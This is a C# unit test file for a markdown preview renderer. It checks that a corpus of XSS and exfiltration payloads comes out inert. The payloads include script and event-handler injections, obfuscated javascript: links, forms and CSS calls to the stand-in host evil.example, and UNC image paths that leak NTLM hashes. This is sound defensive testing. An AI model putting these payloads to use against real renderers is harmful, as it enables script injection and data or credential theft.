using NicPad.Core;
using Xunit;

namespace NicPad.Tests;

/// <summary>XSS / exfiltration corpus for the preview. Every payload must come out inert.</summary>
public class MarkdownRendererTests
{
    private static readonly MarkdownRenderer Renderer = new();

    private static readonly HashSet<string> ForbiddenTags =
    [
        "script", "iframe", "object", "embed", "form", "meta", "base", "style", "link", "svg", "math", "button",
        "noscript", "textarea", "select", "frame", "frameset", "applet", "template",
    ];

    private static readonly HashSet<string> ForbiddenAttributes =
    [
        "srcset", "formaction", "action", "background", "poster", "xlink:href", "srcdoc", "autofocus",
    ];

    /// <summary>Parses the output as a browser would and checks what actually became markup (escaped text is harmless).</summary>
    private static void AssertInert(string html)
    {
        Assert.DoesNotContain("<script", html, StringComparison.OrdinalIgnoreCase);
        var doc = new AngleSharp.Html.Parser.HtmlParser().ParseDocument("<body>" + html + "</body>");
        foreach (var el in doc.Body!.QuerySelectorAll("*"))
        {
            Assert.DoesNotContain(el.LocalName, ForbiddenTags);
            foreach (var attr in el.Attributes)
            {
                var name = attr.Name.ToLowerInvariant();
                var value = attr.Value.ToLowerInvariant();
                Assert.False(name.StartsWith("on", StringComparison.Ordinal), $"event handler {name} on <{el.LocalName}>");
                Assert.DoesNotContain(name, ForbiddenAttributes);
                Assert.DoesNotContain("evil.example", value, StringComparison.Ordinal);
                if (name is "href" or "src")
                {
                    Assert.True(value.StartsWith('#') || value.StartsWith("http", StringComparison.Ordinal)
                        || value.StartsWith("mailto:", StringComparison.Ordinal) || value.StartsWith("data:image/", StringComparison.Ordinal),
                        $"unexpected URL {value}");
                    Assert.DoesNotContain("data:image/svg", value, StringComparison.Ordinal);
                }

                if (name == "style")
                {
                    Assert.DoesNotContain("url(", value, StringComparison.Ordinal);
                    Assert.DoesNotContain("expression", value, StringComparison.Ordinal);
                }
            }
        }
    }

    [Theory]
    [InlineData("<script>alert(1)</script>")]
    [InlineData("<img src=x onerror=alert(1)>")]
    [InlineData("<img/onerror=alert(1) src=x>")]
    [InlineData("<svg onload=alert(1)>")]
    [InlineData("<svg><a xlink:href=\"javascript:alert(1)\"><text>x</text></a></svg>")]
    [InlineData("<a href=\"javascript:alert(1)\">x</a>")]
    [InlineData("<a href=javascript:alert(1)>x</a>")]
    [InlineData("<a href=\"jav&#x09;ascript:alert(1)\">x</a>")]
    [InlineData("<a href=\"JaVaScRiPt:alert(1)\">x</a>")]
    [InlineData("<a href=\"&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert(1)\">x</a>")]
    [InlineData("<a href=\"  javascript:alert(1)\">x</a>")]
    [InlineData("[x](javascript:alert(1))")]
    [InlineData("[x](vbscript:msgbox(1))")]
    [InlineData("[x](<javascript:alert(1)>)")]
    [InlineData("<iframe src=\"https://evil.example\"></iframe>")]
    [InlineData("<object data=\"https://evil.example/x.swf\"></object>")]
    [InlineData("<embed src=\"https://evil.example/x.swf\">")]
    [InlineData("<form action=\"https://evil.example\"><input type=\"password\"></form>")]
    [InlineData("<meta http-equiv=\"refresh\" content=\"0;url=https://evil.example\">")]
    [InlineData("<base href=\"https://evil.example/\">")]
    [InlineData("<style>body{background:url(https://evil.example/x)}</style>")]
    [InlineData("<div style=\"background:url(https://evil.example/x)\">x</div>")]
    [InlineData("<div style=\"width: expression(alert(1))\">x</div>")]
    [InlineData("# Title {onclick=\"alert(1)\"}")]
    [InlineData("<a href=\"data:text/html,<script>alert(1)</script>\">x</a>")]
    [InlineData("<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>")]
    [InlineData("<details open ontoggle=alert(1)>")]
    [InlineData("<a href=\"#\" onmouseover=\"alert(1)\">x</a>")]
    [InlineData("<img src=\"https://ok.example/a.png\" srcset=\"https://evil.example/a.png 1x\">")]
    [InlineData("<link rel=\"stylesheet\" href=\"https://evil.example/x.css\">")]
    [InlineData("<input type=\"text\" autofocus onfocus=alert(1)>")]
    [InlineData("<button formaction=\"javascript:alert(1)\">x</button>")]
    [InlineData("<noscript><p title=\"</noscript><img src=x onerror=alert(1)>\">")]
    [InlineData("<img src=\"data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+\">")]
    public void DangerousInputIsNeutralized(string input)
    {
        AssertInert(Renderer.RenderBody(input, allowRemoteImages: true));
        AssertInert(Renderer.RenderBody(input, allowRemoteImages: false));
    }

    [Theory]
    [InlineData("![a](file://server/share/a.png)")]
    [InlineData("![a](file:///C:/Windows/win.ini)")]
    [InlineData("<img src=\"\\\\server\\share\\a.png\">")]
    [InlineData("![a](//server/share/a.png)")]
    [InlineData("<img src=\"C:\\Windows\\a.png\">")]
    public void LocalAndUncImagesAreAlwaysBlocked(string input)
    {
        // SEC-02: these make Windows authenticate to the host over SMB (NTLM hash leak).
        var html = Renderer.RenderBody(input, allowRemoteImages: true);
        Assert.DoesNotContain("server", html, StringComparison.OrdinalIgnoreCase);
        Assert.DoesNotContain("file:", html, StringComparison.OrdinalIgnoreCase);
        Assert.DoesNotContain("<img", html, StringComparison.OrdinalIgnoreCase);
    }

    [Fact]
    public void RemoteImagesAreBlockedUnlessAllowed()
    {
        const string md = "![logo](https://example.com/logo.png)";
        var blocked = Renderer.RenderBody(md, allowRemoteImages: false);
        Assert.DoesNotContain("example.com", blocked, StringComparison.Ordinal);
        Assert.Contains("nicpad-blocked", blocked, StringComparison.Ordinal);
        Assert.Contains("logo", blocked, StringComparison.Ordinal);

        var allowed = Renderer.RenderBody(md, allowRemoteImages: true);
        Assert.Contains("src=\"https://example.com/logo.png\"", allowed, StringComparison.Ordinal);
    }

    [Fact]
    public void EmbeddedRasterImagesAreAllowed()
    {
        var html = Renderer.RenderBody("![dot](data:image/png;base64,iVBORw0KGgo=)", allowRemoteImages: false);
        Assert.Contains("src=\"data:image/png;base64,iVBORw0KGgo=\"", html, StringComparison.Ordinal);
    }

    [Theory]
    [InlineData("[x](https://example.com/a?b=1)", "href=\"https://example.com/a?b=1\"")]
    [InlineData("[x](http://example.com/)", "href=\"http://example.com/\"")]
    [InlineData("[x](mailto:someone@example.com)", "href=\"mailto:someone@example.com\"")]
    [InlineData("[x](#section-2)", "href=\"#section-2\"")]
    public void SafeLinksAreKept(string md, string expected)
    {
        Assert.Contains(expected, Renderer.RenderBody(md, allowRemoteImages: false), StringComparison.Ordinal);
    }

    [Fact]
    public void RelativeLinksAreInert()
    {
        var html = Renderer.RenderBody("[other](notes/other.md)", allowRemoteImages: false);
        Assert.DoesNotContain("href", html, StringComparison.Ordinal);
        Assert.Contains("other", html, StringComparison.Ordinal);
    }

    [Fact]
    public void CommonMarkdownStillRenders()
    {
        const string md = """
            # Heading

            **bold** *italic* <u>under</u> `code`

            - [x] done
            - [ ] todo

            | a | b |
            |---|--:|
            | 1 | 2 |

            <details><summary>More</summary>Hidden</details>

            <span style="color: red; position: fixed">red</span>

            ```cs
            var x = 1 < 2;
            ```
            """;
        var html = Renderer.RenderBody(md, allowRemoteImages: false);
        Assert.Contains("<h1", html, StringComparison.Ordinal);
        Assert.Contains("<strong>bold</strong>", html, StringComparison.Ordinal);
        Assert.Contains("<em>italic</em>", html, StringComparison.Ordinal);
        Assert.Contains("<u>under</u>", html, StringComparison.Ordinal);
        Assert.Contains("<table>", html, StringComparison.Ordinal);
        Assert.Contains("text-align: right", html, StringComparison.Ordinal);
        Assert.Contains("<details>", html, StringComparison.Ordinal);
        Assert.Contains("<summary>More</summary>", html, StringComparison.Ordinal);
        Assert.Contains("type=\"checkbox\"", html, StringComparison.Ordinal);
        Assert.Contains("disabled", html, StringComparison.Ordinal);
        Assert.Matches("<span style=\"color: [^\"]+\">red</span>", html);
        Assert.DoesNotContain("position", html, StringComparison.Ordinal);
        Assert.Contains("1 &lt; 2", html, StringComparison.Ordinal);
    }

    [Fact]
    public void DocumentHasRestrictiveCspAndEscapedTitle()
    {
        var doc = Renderer.RenderDocument("hi", Themes.Dark.Preview, isDark: true, allowRemoteImages: false, "<b>t</b>");
        Assert.Contains("Content-Security-Policy", doc, StringComparison.Ordinal);
        Assert.Contains("default-src 'none'; img-src data:;", doc, StringComparison.Ordinal);
        Assert.Contains("base-uri 'none'", doc, StringComparison.Ordinal);
        Assert.Contains("<title>&lt;b&gt;t&lt;/b&gt;</title>", doc, StringComparison.Ordinal);
        Assert.Contains("color-scheme\" content=\"dark", doc, StringComparison.Ordinal);
        Assert.Contains("#1e1e1e", doc, StringComparison.Ordinal);

        var remote = Renderer.RenderDocument("hi", Themes.Light.Preview, isDark: false, allowRemoteImages: true, "t");
        Assert.Contains("img-src data: https: http:", remote, StringComparison.Ordinal);
    }

    [Fact]
    public void ExternalLinksGetNoReferrer()
    {
        var html = Renderer.RenderBody("[x](https://example.com)", allowRemoteImages: false);
        Assert.Contains("rel=\"noopener noreferrer\"", html, StringComparison.Ordinal);
    }
}

public class UrlPolicyTests
{
    [Theory]
    [InlineData("https://example.com", UrlKind.Link, false, "https://example.com/")]
    [InlineData("mailto:a@b.c", UrlKind.Link, false, "mailto:a@b.c")]
    [InlineData("#top", UrlKind.Link, false, "#top")]
    [InlineData("#top", UrlKind.Image, true, null)]
    [InlineData("javascript:alert(1)", UrlKind.Link, false, null)]
    [InlineData("jav\tascript:alert(1)", UrlKind.Link, false, null)]
    [InlineData("file:///c:/x", UrlKind.Link, false, null)]
    [InlineData("\\\\host\\share", UrlKind.Link, false, null)]
    [InlineData("//host/x", UrlKind.Link, false, null)]
    [InlineData("ftp://host/x", UrlKind.Link, false, null)]
    [InlineData("relative/path.md", UrlKind.Link, false, null)]
    [InlineData("https://example.com/a.png", UrlKind.Image, false, null)]
    [InlineData("https://example.com/a.png", UrlKind.Image, true, "https://example.com/a.png")]
    [InlineData("data:image/gif;base64,R0lGOD==", UrlKind.Image, false, "data:image/gif;base64,R0lGOD==")]
    [InlineData("data:image/svg+xml;base64,PHN2Zz4=", UrlKind.Image, true, null)]
    [InlineData("data:text/html,hi", UrlKind.Link, false, null)]
    [InlineData("", UrlKind.Link, false, null)]
    public void FilterMatchesPolicy(string url, UrlKind kind, bool remote, string? expected)
    {
        Assert.Equal(expected, UrlPolicy.Filter(url, kind, remote));
    }

    [Theory]
    [InlineData("https://example.com", true)]
    [InlineData("mailto:a@b.c", true)]
    [InlineData("#anchor", false)]
    [InlineData("file:///c:/windows/system32/calc.exe", false)]
    [InlineData("ms-settings:", false)]
    [InlineData("search-ms:query=x", false)]
    [InlineData("C:\\Windows\\System32\\calc.exe", false)]
    public void OnlyWebAndMailLinksOpenExternally(string url, bool expected)
    {
        Assert.Equal(expected, UrlPolicy.CanOpenExternally(url));
    }

    [Theory]
    [InlineData("about:blank", false, false, true)]
    [InlineData("data:text/html;base64,AAAA", false, false, true)]
    [InlineData("https://example.com/a.png", true, false, false)]
    [InlineData("https://example.com/a.png", true, true, true)]
    [InlineData("https://example.com/script.js", false, true, false)]
    [InlineData("file:///c:/a.png", true, true, false)]
    public void PreviewRequestsAreFiltered(string uri, bool image, bool remote, bool expected)
    {
        Assert.Equal(expected, UrlPolicy.IsAllowedPreviewRequest(uri, image, remote));
    }
}
